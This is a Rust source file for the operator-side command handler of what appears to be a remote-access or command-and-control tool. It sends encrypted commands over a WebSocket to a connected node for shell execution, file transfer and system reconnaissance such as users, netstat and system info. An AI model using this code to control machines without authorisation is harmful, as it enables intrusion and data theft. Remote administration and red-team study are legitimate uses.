use std::sync::Arc;
use futures_util::stream::SplitSink;
use tokio::fs;
use tokio::net::TcpStream;
use tokio::sync::Mutex;
use tokio_tungstenite::tungstenite::Message;
use tokio_tungstenite::WebSocketStream;
use crate::communication;
use crate::command::Command as NodeCommand;
use indoc::indoc;

pub struct TxCommandHandler {
    passphrase: String,
    ws_sender: Option<Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>,
}

impl TxCommandHandler {
    pub fn new(
        passphrase: String,
        ws_sender: Option<Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>,
    ) -> Self {
        TxCommandHandler { passphrase, ws_sender }
    }

    pub async fn handle_command(&self, command: &str) {
        let command = command.trim();

        if command.is_empty() {
            println!("Empty command received, nothing to execute.");
            return;
        }

        let parts: Vec<&str> = command.split_whitespace().collect();
        let cmd = parts.get(0).unwrap_or(&"");
        let args = &parts[1..].join(" ");

        let node_command = match cmd.to_uppercase().as_str() {
            "H" | "HELP" => {
                let help = indoc!{"
                    [UPLINK HELP]:

                    H | HELP - Print help
                    ECHO | PRINT | MSG | TEXT | T - Send a message to connected node.

                    GET | DOWNLOAD | D <remote> <local> - Download a file or directory.
                    PUT | UPLOAD | U <local> <remote> - Upload a file or directory.
                    LIST | LS | DIR | L - List files in the directory.

                    SHELL | EXEC | RUN | CMD | E | X <command> - Execute a shell command on the connected node.
                    
                    ID | WHOAMI | WHO | W - Get current user
                    PWD | WHERE - Get current directory path
                    USERS - Get users on the system
                    NETSTAT - Get network connections
                    N | NETWORK | IFCONFIG | IPCONFIG - Get network adapter configuration
                    SYSTEM | INFO | SYSTEMINFO | UNAME - Get system configuration

                    PASSPHRASE - Change the encryption passphrase.
                "};
                println!("{}", help);
                return;
            }
            "TEXT" | "ECHO" | "PRINT" | "MSG" | "T" => NodeCommand::Echo { message: args.to_string() },
            "L" | "LIST" | "LS" | "DIR" => NodeCommand::ListFiles,
            "ID" | "WHOAMI" | "WHO" | "W" => NodeCommand::Whoami,
            "PWD" | "WHERE" => NodeCommand::Pwd,
            "USERS"  => NodeCommand::Users,
            "NETSTAT" => NodeCommand::Netstat,
            "N" | "NETWORK" | "IFCONFIG" | "IPCONFIG" => NodeCommand::Network,
            "SYSTEM" | "INFO" | "SYSTEMINFO" | "UNAME" => NodeCommand::Info,
            "D" | "GET" | "DOWNLOAD" => { 
                let arg_parts: Vec<&str> = args.splitn(2, ' ').collect();

                if arg_parts.len() < 2 {
                    eprintln!("GET/DOWNLOAD command requires both file path and local path.");
                    return;
                }

                let file_path = arg_parts[0].to_string();
                let file_local_path = arg_parts[1].to_string();

                NodeCommand::GetFile { file_path, file_local_path }
            },
            "U" | "PUT" | "UPLOAD" => {
                let arg_parts: Vec<&str> = args.splitn(2, ' ').collect();

                if arg_parts.len() < 2 {
                    eprintln!("PUT/UPLOAD command requires both file path and upload path.");
                    return;
                }

                let file_path = arg_parts[0].to_string();
                let file_up_path = arg_parts[1].to_string();

                let data = fs::read(&file_path).await.unwrap_or_else(|_| vec![]);

                NodeCommand::PutFile { file_path, file_up_path, data }
            }
            "E" | "X" |"SHELL" | "EXEC" | "RUN" | "CMD" => NodeCommand::Execute { command: args.to_string() },
            "PASSPHRASE" => NodeCommand::ChangePassphrase { new_passphrase: args.to_string() },
            _ => {
                eprintln!("Unknown command: {}", command);
                return;
            }
        };

        if let Some(ws_sender) = &self.ws_sender {
            let mut sender = ws_sender.lock().await;
            let serialized_command = serde_json::to_vec(&node_command).expect("Failed to serialize command");
            let encrypted_command = communication::prepare_tx(serialized_command, &self.passphrase);

            if let Err(e) = communication::send_binary_data(&mut sender, encrypted_command).await {
                eprintln!("Failed to send command: {}", e);
            }
        } else {
            eprintln!("No active WebSocket connection. Command not sent.");
        }
    }
}
